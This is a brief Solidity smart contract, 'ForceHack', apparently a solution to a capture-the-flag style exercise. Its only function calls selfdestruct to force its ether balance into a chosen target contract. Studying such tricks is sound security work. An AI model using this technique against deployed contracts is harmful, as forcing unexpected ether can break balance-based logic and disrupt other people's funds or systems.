// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

contract ForceHack {
    
    address target;

    constructor(address _target) payable {
        target = _target;
    }

    function force() public {
        selfdestruct(payable(target));
    }
    
}